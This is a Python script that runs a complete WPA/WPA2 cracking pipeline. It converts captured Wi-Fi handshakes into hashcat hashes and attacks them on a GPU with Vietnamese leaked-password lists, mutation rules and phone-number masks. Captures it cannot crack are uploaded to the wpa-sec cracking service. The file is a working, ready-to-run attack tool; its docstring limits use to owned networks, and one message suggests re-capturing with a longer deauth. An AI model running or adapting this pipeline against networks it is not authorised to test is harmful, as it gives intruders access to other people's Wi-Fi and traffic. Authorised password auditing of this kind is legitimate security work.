#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
crack.py -- WPA/WPA2 crack pipeline (pcap-first).

    handshakes/pending/*.pcap --hcxpcapngtool--> <name>_hs.22000 --hashcat--> password

WHAT THIS SCRIPT DOES
---------------------
1. CONVERT  Every .pcap / .pcapng / .cap dropped in handshakes/pending/ is
            converted to a hashcat .22000 hash file with `hcxpcapngtool`
            (hcxtools). The original capture is kept next to it, because
            wpa-sec accepts the .pcap and NOT the .22000.
            A capture that contains no EAPOL/PMKID is reported and moved to
            fail/ (nothing to crack) and listed in work/nohandshake.txt.
2. CRACK    hashcat runs a layered attack on the GPU. Order matters:
            rules -> wordlists -> masks. Real passphrases are a word plus a
            small variation (trung123, Trung@2026), not random noise, so a
            rule attack beats a mask at the same keyspace.
            Target box: Dell Precision 7520, Quadro M2200, ~94k H/s at -m 22000.
3. CLASSIFY Cracked -> handshakes/success/, not cracked -> handshakes/fail/.
            ONE POTFILE PER HASH (work/potfiles/<stem>.potfile). A single shared
            potfile is what made the old bash script report a false "cracked"
            whenever a password from a previous hash was still lying around.
4. HAND OFF By default a capture the local pipeline cannot crack is uploaded to
            wpa-sec.stanev.org (volunteer GPUs, no Vietnamese dictionaries).

DIVISION OF LABOUR WITH WPA-SEC (this is the default, not an extra flag)
-----------------------------------------------------------------------
By default the local machine runs ONLY the layers wpa-sec cannot do, and hands
the rest of the keyspace to the queue.

    wpa-sec already covers (so we skip these by default):
        hashes.org 2015-2018, OffSec 33M, InsidePro, Wikipedia x5, OpenWall,
        Num8 (the complete 8-digit space), WPSkey 1-9, C-nets, Used,
        the dynamic cracked.txt, prdict.

    the local machine keeps (wpa-sec has nothing for these):
        S1      SSID-as-password      - only your own capture knows the ESSID
        A2/A3   VN leaked dict + VN rules / leetspeak
        B1-B7   VN wordlists (dates, vn1k, vn10k, vn1m, vn-wifi)
        C1-C3   Vietnamese phone masks (10 digits)
                                      - wpa-sec's Num8 is 8 digits only

    Skipping rockyou + the 8-digit masks saves roughly 7.4 h per hash on a
    Quadro M2200, and it means rockyou.txt (134 MB) is not needed at all.

    --full       also run the layers wpa-sec already covers (old behaviour)
    --no-wpasec  never upload; crack locally only

USAGE
-----
    ./crack.py                       # convert + crack every pending capture
    ./crack.py capture.pcap          # one capture (.pcap/.pcapng/.cap/.22000)
    ./crack.py --dry                 # print what would run, touch nothing
    ./crack.py --convert-only        # only .pcap -> _hs.22000, no cracking
    ./crack.py --background          # detached, log to work/crack.log
    ./crack.py --full                # also run the wpa-sec-covered layers
    ./crack.py --no-wpasec           # crack locally, never upload
    ./crack.py --vn-only             # accepted for compatibility (= the default)

wpa-sec key: env WPASEC_KEY, or ~/wifi-cracker/.wpasec_key (gitignored,
chmod 600). Get one at https://wpa-sec.stanev.org/?get_key
Manual client: ./wpasec.py status | push <file|dir> | pull

LEGAL
-----
Only crack networks and machines you own or are licensed to test. Capturing a
stranger's handshake and cracking it is unauthorised access (Article 291 of the
Vietnamese Penal Code). Use your own lab: one phone as hotspot, one as victim.
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
import sys
import time
import urllib.request
import urllib.parse
from pathlib import Path

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------
BASE       = Path(os.environ.get("WIFI_CRACKER_DIR", "") or (Path.home() / "wifi-cracker"))
HANDSHAKES = BASE / "handshakes"
SUCCESS    = HANDSHAKES / "success"
FAIL       = HANDSHAKES / "fail"
PENDING    = HANDSHAKES / "pending"
WORDLISTS  = BASE / "wordlists"
DL_DIR     = WORDLISTS / "vie_wpa2_pw"
VI_DIR     = WORDLISTS / "wordlists-vi"
WORK       = BASE / "work"
POTFILES   = WORK / "potfiles"
LOGDIR     = WORK / "logs"
ESSIDS     = WORK / "essids"

# Inputs the pipeline understands.
CAPTURE_EXT = (".pcap", ".pcapng", ".cap")   # what hcxpcapngtool can read
HASH_EXT    = (".22000", ".hc22000")         # what hashcat -m 22000 reads

# Tools
HASHCAT        = os.environ.get("HASHCAT_BIN", "hashcat")
HCXPCAPNGTOOL  = os.environ.get("HCXPCAPNGTOOL_BIN", "hcxpcapngtool")

# ---------------------------------------------------------------------------
# hashcat rule resolution
#
# Rule files live in different places on different distros, AND the file names
# changed in hashcat 7.x (best66.rule replaced best64.rule). A missing rule file
# is NOT an error for hashcat -- the layer simply runs nothing, which is how the
# whole rules phase can silently disappear from a run. So: resolve every rule
# explicitly, print what was resolved, and warn loudly on anything missing.
# ---------------------------------------------------------------------------
def _rule_dirs() -> list[Path]:
    cands: list[Path] = []
    env = os.environ.get("HASHCAT_RULE_DIR")
    if env:
        cands.append(Path(env))
    cands += [
        Path("/usr/share/hashcat/rules"),         # Debian/Ubuntu, Fedora
        Path("/usr/share/doc/hashcat/rules"),     # Arch / CachyOS (verified)
        Path("/usr/local/share/hashcat/rules"),
        Path("/opt/homebrew/share/hashcat/rules"),
    ]
    return cands


def resolve_rule(*names: str) -> Path | None:
    """First existing rule file out of `names`, searched in repo then hashcat dirs.

    Repo copies (wordlists/) win so the pipeline does not depend on the distro
    shipping hashcat's rules at all.
    """
    search: list[Path] = [WORDLISTS, *_rule_dirs()]
    for name in names:
        for d in search:
            p = d / name
            if p.is_file() and p.stat().st_size > 0:
                return p
    return None


# Generic rules: hashcat 7.x ships best66.rule, hashcat 6.x ships best64.rule.
GENERIC_RULE = resolve_rule("best66.rule", "best64.rule")
LEET_RULE    = resolve_rule("leetspeak.rule", "Incisive-leetspeak.rule",
                            "unix-ninja-leetspeak.rule")
COMB_RULE    = resolve_rule("combinator.rule")

# ---------------------------------------------------------------------------
# Vietnamese rules + wordlists (shipped inside the repo -> no distro dependency)
#   vn-heavy.rule : 446 rules, for SMALL wordlists (PERS, vn1k, vn10k)
#   vn-lite.rule  :  63 rules, for LARGE wordlists (vn1m, vn-combine, vn-wifi)
# Both were generated from 384,189 leaked Vietnamese passwords and validated
# with `hashcat --stdout` (all rules parse).
# ---------------------------------------------------------------------------
VN_HEAVY = WORDLISTS / "vn-heavy.rule"
VN_LITE  = WORDLISTS / "vn-lite.rule"

ROCKYOU  = WORDLISTS / "rockyou.txt"        # 14.3M lines, NOT committed (134 MB)
PERS     = DL_DIR / "vie-personal_dehashed_dict-18may2025.txt"

MASK_SRC = {
    "C1_phone_main": DL_DIR / "vie-phonenumber_main.rule",
    "C2_phone_sub":  DL_DIR / "vie-phonenumber_sub.rule",
    "C3_misc":       DL_DIR / "vie-miscnumber.rule",
}

# ---------------------------------------------------------------------------
# hashcat invocation
#   -m 22000 : WPA/WPA2 (EAPOL + PMKID)
#   -w 3     : max workload
#   --backend-ignore-cuda   : silence the CUDA-RTC spinner on an OpenCL-only box
#   --hwmon-temp-abort 95   : stop if the GPU hits 95 C (protects the shared
#                             heatsink / CPU as well)
# ---------------------------------------------------------------------------
HC_BASE = ["-m", "22000", "-w", "3", "--backend-ignore-cuda",
           "--status", "--status-timer", "5", "--hwmon-temp-abort", "95"]

# --- keep the machine awake while cracking --------------------------------
# hashcat runs headless, so systemd-logind decides the box is idle and suspends
# it mid-crack. On this laptop a suspend hangs the GPU (failing BGA joint) and
# leaves a black screen until reboot. systemd-inhibit pins the idle lock for
# exactly as long as hashcat runs, then releases it -- the same mechanism a video
# player uses.
_INHIBIT_BASE = ["systemd-inhibit", "--what=idle", "--who=wifi-cracker",
                 "--mode=block", "--why=Cracking WPA2"]


def _inhibit_available() -> bool:
    """systemd-inhibit exists AND can actually take a lock here (needs logind)."""
    if not shutil.which("systemd-inhibit"):
        return False
    try:
        r = subprocess.run([*_INHIBIT_BASE, "true"], capture_output=True, timeout=15)
        return r.returncode == 0
    except Exception:
        return False


INHIBIT = _INHIBIT_BASE if _inhibit_available() else []

# ---------------------------------------------------------------------------
# Telegram notifications (optional). Token lives in ~/wifi-cracker/.telegram_secret
# (gitignored, chmod 600). Without it, notifications are silently skipped.
# ---------------------------------------------------------------------------
TELEGRAM_CHAT_ID = "5697772057"
TELEGRAM_SECRET_FILE = BASE / ".telegram_secret"


def _tg_token():
    try:
        data = TELEGRAM_SECRET_FILE.read_text().strip()
        return data or None
    except Exception:
        return None


def send_telegram(message, silent=True):
    """Best-effort Telegram send. Never raises, never blocks a crack run."""
    token = _tg_token()
    if not token:
        return
    try:
        payload = urllib.parse.urlencode({
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "disable_notification": "true" if silent else "false",
        }).encode()
        with urllib.request.urlopen(
                f"https://api.telegram.org/bot{token}/sendMessage",
                data=payload, timeout=15) as r:
            r.read()
    except Exception as e:
        print(f"[telegram] send failed: {e}", flush=True)


# ---------------------------------------------------------------------------
# Colors (only on a TTY)
# ---------------------------------------------------------------------------
if sys.stdout.isatty():
    C = dict(off="\033[0m", red="\033[31m", green="\033[32m", yel="\033[33m", blu="\033[34m")
else:
    C = dict(off="", red="", green="", yel="", blu="")
OK   = lambda *a: print(f"{C['green']}[+]{C['off']}", *a)
WARN = lambda *a: print(f"{C['yel']}[!]{C['off']}", *a)
ERR  = lambda *a: print(f"{C['red']}[x]{C['off']}", *a)
INFO = lambda *a: print(f"{C['blu']}[i]{C['off']}", *a)


# ---------------------------------------------------------------------------
# Name helpers -- the ONE convention the whole project relies on:
#     capture  <base>.pcap        <->   hash  <base>_hs.22000
# ---------------------------------------------------------------------------
def base_of_capture(p: Path) -> str:
    return p.stem


def hash_for_capture(p: Path) -> Path:
    return p.parent / f"{base_of_capture(p)}_hs.22000"


def base_of_hash(p: Path) -> str:
    name = p.name
    for ext in HASH_EXT:
        if name.lower().endswith(ext):
            name = name[: -len(ext)]
            break
    return re.sub(r"_hs$", "", name)


def capture_for_hash(p: Path) -> Path | None:
    """The .pcap/.pcapng/.cap that belongs to a hash file, if it is still there."""
    base = base_of_hash(p)
    for ext in CAPTURE_EXT:
        cand = p.parent / f"{base}{ext}"
        if cand.exists():
            return cand
    return None


# ---------------------------------------------------------------------------
# Small helpers
# ---------------------------------------------------------------------------
def normalize_crlf(src: Path, dst: Path) -> int:
    """Copy `src` to `dst` with LF line endings. Returns the line count."""
    data = src.read_bytes().replace(b"\r\n", b"\n").replace(b"\r", b"\n")
    dst.write_bytes(data)
    return data.count(b"\n")


def mask_count(path: Path) -> int:
    return sum(1 for ln in path.open(errors="replace") if ln.strip())


def count_hashes(hash_path: Path) -> int:
    """Number of usable hash lines in a .22000 (0 == no handshake in capture)."""
    if not hash_path.exists():
        return 0
    n = 0
    for ln in hash_path.open(errors="replace"):
        ln = ln.strip()
        if ln and ln.startswith("WPA*"):
            n += 1
    return n


def is_cracked(hash_path: Path, potfile: Path) -> bool:
    """True if THIS hash's password is in THIS hash's potfile.

    hashcat itself does the hash<->potfile matching via --show. Splitting the
    .22000 line on ':' by hand does not work: hashcat 7 stores the PMKID hash
    field, which never matches a raw token, so every hash looked like a fail.
    """
    if not potfile.exists() or potfile.stat().st_size == 0:
        return False
    try:
        out = subprocess.run(
            [HASHCAT, "-m", "22000", f"--potfile-path={potfile}", "--show", str(hash_path)],
            capture_output=True, text=True, timeout=30)
    except Exception:
        return False
    for line in out.stdout.splitlines():
        line = line.strip()
        if not line or line.startswith("No hashes") or line.startswith("Separator"):
            continue
        if ":" in line:
            return True
    return False


def show_result(hash_path: Path, potfile: Path) -> None:
    print()
    OK("=" * 62)
    OK("CRACKED! Recovered password:")
    print("-" * 62)
    subprocess.run([HASHCAT, "-m", "22000", f"--potfile-path={potfile}",
                    "--show", str(hash_path)])
    print("-" * 62)
    print()


# ---------------------------------------------------------------------------
# Step 0 -- pcap -> 22000 conversion (the new front door of the pipeline)
# ---------------------------------------------------------------------------
_HCX_INTERESTING = re.compile(
    r"ESSID \(total unique\)|ESSID \(total\)|EAPOL pairs \(best\)|"
    r"EAPOL messages \(total\)|PMKID|written to 22000 hash file", re.I)


def convert_capture(pcap: Path, hash_path: Path, dry: bool = False) -> tuple[bool, int, Path | None]:
    """Convert one capture to a hashcat .22000 hash file.

    Returns (converted_ok, number_of_hashes, essid_file_or_None).

    NOTE: hcxpcapngtool APPENDS to its output files -- running it twice on the
    same capture doubles the hash lines. The outputs are therefore deleted
    first; a clean conversion is the only correct one.
    """
    base = base_of_capture(pcap)
    essid_path = ESSIDS / f"{base}.essid"
    cmd = [HCXPCAPNGTOOL, "-o", str(hash_path), "-E", str(essid_path), str(pcap)]

    if dry:
        print(f"  (dry) {' '.join(cmd)}")
        n = count_hashes(hash_path)
        if n == 0:
            WARN(f"  (dry) no {hash_path.name} yet -- run without --dry to convert")
            return False, 0, None
        return True, n, (essid_path if essid_path.exists() else None)

    for stale in (hash_path, essid_path):
        try:
            stale.unlink()
        except FileNotFoundError:
            pass
    ESSIDS.mkdir(parents=True, exist_ok=True)

    proc = subprocess.run(cmd, capture_output=True, text=True, errors="replace")
    out = proc.stdout + proc.stderr

    if proc.returncode != 0:
        ERR(f"hcxpcapngtool failed on {pcap.name} (exit {proc.returncode})")
        for ln in out.splitlines()[-5:]:
            print("    " + ln)
        return False, 0, None

    for ln in out.splitlines():
        if _HCX_INTERESTING.search(ln):
            print("    " + ln.strip())

    n = count_hashes(hash_path)
    essid_file = essid_path if (essid_path.exists() and essid_path.stat().st_size) else None
    if n:
        OK(f"converted {pcap.name} -> {hash_path.name} ({n} hash line(s))")
    else:
        WARN(f"{pcap.name}: hcxpcapngtool produced no EAPOL/PMKID hash")
    return True, n, essid_file


# ---------------------------------------------------------------------------
# wpa-sec upload (hands the rest of the keyspace to the volunteer queue)
# ---------------------------------------------------------------------------
WPASEC_KEY_FILE = BASE / ".wpasec_key"


def wpasec_key() -> str | None:
    """wpa-sec key: env WPASEC_KEY wins, then ~/wifi-cracker/.wpasec_key."""
    k = os.environ.get("WPASEC_KEY", "").strip()
    if not k:
        try:
            k = WPASEC_KEY_FILE.read_text().strip()
        except Exception:
            return None
    return k or None


def wpasec_push(hash_path: Path) -> None:
    """Upload the capture that belongs to `hash_path`. Best effort: never fatal."""
    if not wpasec_key():
        WARN("wpa-sec skipped: no key (see README -- ~/wifi-cracker/.wpasec_key)")
        return
    try:
        sys.path.insert(0, str(Path(__file__).resolve().parent))
        from wpasec import find_capture_for, push_file
    except Exception as e:
        WARN(f"wpa-sec skipped: cannot import wpasec.py ({e})")
        return
    pcap = find_capture_for(hash_path) or capture_for_hash(hash_path)
    if not pcap:
        WARN(f"wpa-sec skipped: no .pcap next to {hash_path.name} "
             "(the server does not accept .22000)")
        return
    OK(f"handing off to wpa-sec: {pcap.name}")
    try:
        push_file(pcap, wpasec_key())
    except Exception as e:
        WARN(f"wpa-sec upload failed (ignored): {type(e).__name__}: {e}")


def wpasec_pull_summary() -> None:
    """Fetch results already cracked for our key. Best effort."""
    if not wpasec_key():
        return
    try:
        sys.path.insert(0, str(Path(__file__).resolve().parent))
        import wpasec
    except Exception:
        return
    print()
    OK("wpa-sec results for your key:")
    try:
        wpasec.pull()
    except SystemExit:
        pass
    except Exception as e:
        WARN(f"wpa-sec pull failed (ignored): {type(e).__name__}: {e}")


# ---------------------------------------------------------------------------
# Attack layers
# ---------------------------------------------------------------------------
def _tel(label):
    send_telegram(f"[WIFI-CRACKER] \u25b6 START {label}")


def run_dict(label, wordlist, hash_path, potfile, dry=False):
    log = LOGDIR / f"{label}.log"
    log.write_text("")
    OK(f"Step: {label}")
    if dry:
        print(f"  (dry) hashcat -a 0 {' '.join(HC_BASE)} --potfile-path {potfile} {hash_path} {wordlist}")
        return
    _tel(label)
    with log.open("a") as f:
        subprocess.run(
            [*INHIBIT, HASHCAT, "-a", "0", *HC_BASE, f"--potfile-path={potfile}",
             str(hash_path), str(wordlist)],
            stdin=subprocess.DEVNULL, stdout=f, stderr=subprocess.STDOUT)


def run_dict_rule(label, wordlist, rule, hash_path, potfile, dry=False):
    if rule is None or not Path(rule).exists():
        WARN(f"SKIP {label}: rule file not found ({rule}) -- layer would be a no-op")
        return
    log = LOGDIR / f"{label}.log"
    log.write_text("")
    OK(f"Step: {label}   (wordlist + {Path(rule).name})")
    if dry:
        print(f"  (dry) hashcat -a 0 {' '.join(HC_BASE)} -r {rule} --potfile-path {potfile} {hash_path} {wordlist}")
        return
    _tel(label)
    with log.open("a") as f:
        subprocess.run(
            [*INHIBIT, HASHCAT, "-a", "0", *HC_BASE, "-r", str(rule), f"--potfile-path={potfile}",
             str(hash_path), str(wordlist)],
            stdin=subprocess.DEVNULL, stdout=f, stderr=subprocess.STDOUT)


def run_maskfile(label, maskfile, hash_path, potfile, dry=False):
    """Run every mask listed in `maskfile` (hashcat .hcmask style, one per line)."""
    if not maskfile.exists():
        WARN(f"SKIP {label}: missing {maskfile}")
        return False
    masks = mask_count(maskfile)
    if masks == 0:
        WARN(f"SKIP {label}: {maskfile.name} has no masks")
        return False
    OK(f"Layer: {label} ({masks} masks, -a 3)")
    if not dry:
        _tel(label)
    for i, line in enumerate(maskfile.open(errors="replace"), 1):
        line = line.strip()
        if not line:
            continue
        OK(f"  [mask {i}/{masks}] {line}")
        if dry:
            print(f"    (dry) hashcat -a 3 {' '.join(HC_BASE)} --potfile-path {potfile} {hash_path} \"{line}\"")
            continue
        with open(LOGDIR / f"{label}.log", "a") as f:
            subprocess.run(
                [*INHIBIT, HASHCAT, "-a", "3", *HC_BASE, f"--potfile-path={potfile}",
                 str(hash_path), line],
                stdin=subprocess.DEVNULL, stdout=f, stderr=subprocess.STDOUT)
        if is_cracked(hash_path, potfile):
            return True
    return is_cracked(hash_path, potfile)


def run_mask(label, mask_string, hash_path, potfile, dry=False):
    log = LOGDIR / f"{label}.log"
    log.write_text("")
    OK(f"Step: {label}  (mask {mask_string})")
    if dry:
        print(f"  (dry) hashcat -a 3 {' '.join(HC_BASE)} --potfile-path {potfile} {hash_path} {mask_string}")
        return
    _tel(label)
    with log.open("a") as f:
        subprocess.run(
            [*INHIBIT, HASHCAT, "-a", "3", *HC_BASE, f"--potfile-path={potfile}",
             str(hash_path), mask_string],
            stdin=subprocess.DEVNULL, stdout=f, stderr=subprocess.STDOUT)


# ---------------------------------------------------------------------------
# Classification
# ---------------------------------------------------------------------------
def _finish(hash_path: Path, potfile: Path, dry: bool, t0: float) -> str:
    result = classify(hash_path, potfile, dry)
    dur = time.time() - t0
    send_telegram(
        f"[WIFI-CRACKER] DONE {hash_path.name}: "
        + ("CRACKED \u2705" if result == "success" else "FAIL \u2716")
        + f" in {dur/60:.1f} min")
    return result


def classify(hash_path: Path, potfile: Path, dry: bool = False) -> str:
    """Move the hash (and its capture) to success/ or fail/.

    In --dry mode the filesystem is never touched -- only the outcome is printed.
    """
    if is_cracked(hash_path, potfile):
        dest, result = SUCCESS, "success"
        OK(f"-> SUCCESS: {hash_path.name}")
    else:
        dest, result = FAIL, "fail"
        WARN(f"-> FAIL:    {hash_path.name}")

    if dry:
        WARN(f"  (dry) would move {hash_path.name} -> {dest}")
        return result

    for p in (hash_path, capture_for_hash(hash_path)):
        if p and p.exists():
            shutil.move(str(p), str(dest / p.name))
    return result


def _fail_no_handshake(pcap: Path, hash_path: Path, dry: bool) -> str:
    """A capture with no usable handshake: report it, do not pretend to crack it."""
    WARN(f"{pcap.name} contains no EAPOL/PMKID handshake -- nothing to crack.")
    WARN("Re-capture (longer deauth / wait for the client to reconnect), or upload")
    WARN("the capture manually: ./wpasec.py push " + str(pcap))
    if dry:
        WARN(f"  (dry) would move {pcap.name} -> {FAIL}")
        return "fail"
    FAIL.mkdir(parents=True, exist_ok=True)
    WORK.mkdir(parents=True, exist_ok=True)
    with (WORK / "nohandshake.txt").open("a") as f:
        f.write(f"{pcap.name}\n")
    for p in (hash_path, pcap):
        if p and p.exists():
            shutil.move(str(p), str(FAIL / p.name))
    return "fail"


# ---------------------------------------------------------------------------
# The pipeline for ONE capture (or one bare .22000)
# ---------------------------------------------------------------------------
def process_one(target: Path, opts) -> str:
    t0 = time.time()
    dry = opts.dry

    # --- 0. normalise the input: is it a capture or a hash? -------------
    if target.suffix.lower() in CAPTURE_EXT:
        pcap = target
        hash_path = hash_for_capture(target)
    elif target.suffix.lower() in HASH_EXT:
        pcap = capture_for_hash(target)
        hash_path = target
        if not hash_path.exists() and not dry:
            ERR(f"hash file not found: {hash_path}")
            return "fail"
        if pcap is None:
            WARN(f"{target.name}: no .pcap next to it -- cracking is fine, but "
                 "wpa-sec upload needs the original capture")
    else:
        ERR(f"unsupported input: {target.name} (want {', '.join(CAPTURE_EXT + HASH_EXT)})")
        return "fail"

    potfile = POTFILES / f"{hash_path.stem}.potfile"
    for d in (WORK, POTFILES, LOGDIR, ESSIDS):
        d.mkdir(parents=True, exist_ok=True)

    OK("=" * 62)
    OK(f"Capture  : {pcap.name if pcap else '(none -- bare .22000)'}")
    OK(f"Hashfile : {hash_path.name}")
    OK(f"Potfile  : {potfile.name}")
    OK("=" * 62)

    # --- already cracked in a previous run? ----------------------------
    if is_cracked(hash_path, potfile):
        WARN("Already cracked previously -- classifying as success without re-running.")
        return _finish(hash_path, potfile, dry, t0)

    # --- 1. CONVERT ----------------------------------------------------
    essid_file = None
    if pcap is not None:
        INFO("Step: convert capture -> hashcat -m 22000")
        ok, n_hashes, essid_file = convert_capture(pcap, hash_path, dry)
        if not ok and not dry:
            return "fail"
        if n_hashes == 0 and not dry:
            return _fail_no_handshake(pcap, hash_path, dry)
    else:
        n_hashes = count_hashes(hash_path)

    if opts.convert_only:
        OK(f"--convert-only: {hash_path.name} ready, cracking skipped.")
        return "converted"

    # --- 2. CRACK ------------------------------------------------------
    # Mask files come from the vie_wpa2_pw repo; normalise line endings (CRLF
    # would otherwise inject a trailing \r into every mask).
    mask_files = {}
    for label, src in MASK_SRC.items():
        dst = WORK / f"{label}.hcmask"
        if src.exists() and not dry:
            normalize_crlf(src, dst)
        mask_files[label] = dst if dst.exists() else src
    alive = {l: m for l, m in mask_files.items() if m.exists()}
    OK(f"Mask files ready: {len(alive)}/{len(mask_files)} "
       f"({', '.join(alive) if alive else 'none'})")
    print()

    heavy = VN_HEAVY if VN_HEAVY.exists() else None
    lite  = VN_LITE if VN_LITE.exists() else None
    if heavy is None or lite is None:
        WARN("vn-heavy.rule / vn-lite.rule missing from wordlists/ -- "
             "the Vietnamese layers will be weak (see README)")

    def hit():
        return is_cracked(hash_path, potfile)

    # ===== S: the SSID itself as a password (only OUR capture knows it) =====
    if essid_file is not None:
        n = mask_count(essid_file)
        if 0 < n <= 1000:
            rule = heavy or lite or GENERIC_RULE
            run_dict_rule("S1_ssid", essid_file, rule, hash_path, potfile, dry)
            if hit():
                return _finish(hash_path, potfile, dry, t0)
        elif n > 1000:
            WARN(f"SSID layer skipped: {n} ESSIDs in the capture (scan dump, not a target)")

    # ===== VIETNAMESE LAYERS -- wpa-sec has none of this -> ALWAYS RUN =====
    if PERS.exists() and heavy:
        run_dict_rule("A2_vn_heavy", PERS, heavy, hash_path, potfile, dry)
        if hit():
            return _finish(hash_path, potfile, dry, t0)
    if PERS.exists() and LEET_RULE:
        run_dict_rule("A3_vn_leetspeak", PERS, LEET_RULE, hash_path, potfile, dry)
        if hit():
            return _finish(hash_path, potfile, dry, t0)

    # ===== GENERIC LAYERS -- wpa-sec already covers these (queue-side) =====
    if not opts.full:
        INFO("Skipping A1/A4/A5 (rockyou) and C4/C5 (8-digit masks): "
             "wpa-sec covers them. Use --full to run them here anyway.")
    else:
        if ROCKYOU.exists() and GENERIC_RULE:
            run_dict_rule("A1_rockyou_generic", ROCKYOU, GENERIC_RULE, hash_path, potfile, dry)
            if hit():
                return _finish(hash_path, potfile, dry, t0)
            if LEET_RULE:
                run_dict_rule("A4_rockyou_leetspeak", ROCKYOU, LEET_RULE, hash_path, potfile, dry)
                if hit():
                    return _finish(hash_path, potfile, dry, t0)
            if COMB_RULE:
                run_dict_rule("A5_rockyou_combinator", ROCKYOU, COMB_RULE, hash_path, potfile, dry)
                if hit():
                    return _finish(hash_path, potfile, dry, t0)
        elif dry and not ROCKYOU.exists():
            WARN(f"rockyou.txt missing ({ROCKYOU}) -- A1/A4/A5 would be skipped")

    # ===== B: Vietnamese wordlists =====
    b_list = [
        ("B1_common_date", DL_DIR / "vie-common_date.txt"),
        ("B2_vn1k",        VI_DIR / "wordlists-vn1k.txt"),
        ("B3_vn10k",       VI_DIR / "wordlists-vn10k.txt"),
        ("B4_vn1m",        VI_DIR / "wordlists-vn1m.txt"),
        ("B5_vn_wifi",     VI_DIR / "wordlists-vn-wifi.txt.txt"),
    ]
    for label, wl in b_list:
        if wl.exists():
            run_dict(label, wl, hash_path, potfile, dry)
            if hit():
                return _finish(hash_path, potfile, dry, t0)
        elif dry:
            WARN(f"SKIP {label}: missing {wl}")

    # ===== B2: VN wordlist + VN rules (wpa-sec has no Vietnamese rules) =====
    b_rule_list = []
    if lite and (VI_DIR / "wordlists-vn-wifi.txt.txt").exists():
        b_rule_list.append(("B6_vn_wifi_lite", VI_DIR / "wordlists-vn-wifi.txt.txt", lite))
    if heavy and (VI_DIR / "wordlists-vn10k.txt").exists():
        b_rule_list.append(("B7_vn10k_heavy", VI_DIR / "wordlists-vn10k.txt", heavy))
    for label, wl, rule in b_rule_list:
        run_dict_rule(label, wl, rule, hash_path, potfile, dry)
        if hit():
            return _finish(hash_path, potfile, dry, t0)

    # ===== C: masks =====
    #   C1-C3 : Vietnamese phone numbers, 10 digits -> wpa-sec only has 8 digit
    for label in ("C1_phone_main", "C2_phone_sub", "C3_misc"):
        mf = mask_files.get(label)
        if mf and mf.exists() and run_maskfile(label, mf, hash_path, potfile, dry):
            return _finish(hash_path, potfile, dry, t0)
    #   C4-C5 : any 8 digits / 8 digits starting with 0 -> wpa-sec Num8 has this
    if opts.full:
        for label, mask in (("C4_8digit", "?d?d?d?d?d?d?d?d"),
                            ("C5_leading0", "0?d?d?d?d?d?d?d")):
            run_mask(label, mask, hash_path, potfile, dry)
            if hit():
                return _finish(hash_path, potfile, dry, t0)

    # ===== nothing local worked -> hand the capture to wpa-sec =====
    WARN(f"No password recovered locally for {hash_path.name}.")
    WARN(f"Logs: {LOGDIR}")
    if opts.wpasec and not dry:
        wpasec_push(hash_path)          # BEFORE classify(): classify moves the .pcap
    return _finish(hash_path, potfile, dry, t0)


# ---------------------------------------------------------------------------
# Which files are pending?
# ---------------------------------------------------------------------------
def discover_pending() -> list[Path]:
    """Pending captures (.pcap/.pcapng/.cap) + bare .22000 with no capture.

    If both `<base>.pcap` and `<base>_hs.22000` are present, the capture wins:
    the .22000 is regenerated from it, so it is never processed twice.
    """
    items: list[Path] = []
    seen: set[str] = set()
    entries = sorted(p for p in PENDING.glob("*") if p.is_file())

    for p in entries:
        if p.suffix.lower() in CAPTURE_EXT:
            b = base_of_capture(p)
            if b not in seen:
                seen.add(b)
                items.append(p)
    for p in entries:
        if p.suffix.lower() in HASH_EXT:
            b = base_of_hash(p)
            if b not in seen:
                seen.add(b)
                items.append(p)
    return items


# ---------------------------------------------------------------------------
# Environment report -- printed once per run so the state is never a mystery
# ---------------------------------------------------------------------------
class Options:
    def __init__(self, dry=False, full=False, wpasec=True, convert_only=False):
        self.dry = dry
        self.full = full
        self.wpasec = wpasec
        self.convert_only = convert_only


def banner(opts) -> None:
    OK("=== WPA/WPA2 crack pipeline (pcap-first) ===")
    INFO(f"Mode     : {'DRY RUN (nothing is written or moved)' if opts.dry else 'LIVE'}"
         + (" | CONVERT ONLY" if opts.convert_only else ""))
    INFO(f"Local    : {'ALL layers (including the ones wpa-sec covers)' if opts.full else 'only the layers wpa-sec does NOT cover'}")
    INFO(f"wpa-sec  : {'upload captures that fail locally' if opts.wpasec else 'disabled (--no-wpasec)'}"
         + ("" if wpasec_key() else "  [no key set -> uploads will be skipped]"))
    for tool, args in ((HASHCAT, ["--version"]), (HCXPCAPNGTOOL, ["--version"])):
        try:
            v = subprocess.run([tool, *args], capture_output=True, text=True,
                               timeout=20).stdout.strip().splitlines()
            INFO(f"{tool:<14}: {v[0] if v else '?'}")
        except Exception:
            ERR(f"{tool:<14}: NOT FOUND -- needed for "
                + ("cracking" if tool == HASHCAT else "pcap -> 22000 conversion"))
    INFO(f"generic rule: {GENERIC_RULE if GENERIC_RULE else 'NONE FOUND (A1/A4/A5 disabled)'}")
    INFO(f"leet rule   : {LEET_RULE if LEET_RULE else 'NONE FOUND (A3 disabled)'}")
    INFO(f"keep awake  : {'systemd-inhibit idle lock active' if INHIBIT else 'systemd-inhibit not available'}")
    INFO(f"wordlists   : {BASE}")
    print()


# ---------------------------------------------------------------------------
def main(argv):
    dry = full = False
    bg = False
    wpasec = True
    convert_only = False

    for a in argv[1:]:
        if a == "--dry":
            dry = True
        elif a == "--full":
            full = True
        elif a == "--background":
            bg = True
        elif a == "--no-wpasec":
            wpasec = False
        elif a == "--wpasec":
            wpasec = True                 # kept for compatibility (already default)
        elif a == "--vn-only":
            full = False                  # kept for compatibility (now the default)
        elif a == "--convert-only":
            convert_only = True
        elif a in ("-h", "--help"):
            print(__doc__)
            return 0
        elif a.startswith("-"):
            ERR(f"unknown flag: {a}")
            return 2

    opts = Options(dry=dry, full=full, wpasec=wpasec, convert_only=convert_only)
    args = [a for a in argv[1:] if not a.startswith("-")]

    if bg and not args:
        logf = WORK / "crack.log"
        logf.parent.mkdir(parents=True, exist_ok=True)
        print(f"Starting background run -> logging to {logf}")
        child_args = [a for a in argv[1:] if a != "--background"]
        # -u / PYTHONUNBUFFERED: without it Python block-buffers stdout into the
        # log file and `tail -f work/crack.log` stays empty for minutes.
        env = {**os.environ, "PYTHONUNBUFFERED": "1"}
        with logf.open("a") as f:
            n = subprocess.Popen([sys.executable, "-u", str(Path(__file__).resolve()), *child_args],
                                 stdout=f, stderr=subprocess.STDOUT,
                                 stdin=subprocess.DEVNULL, env=env,
                                 start_new_session=True)
        print(f"PID {n.pid}")
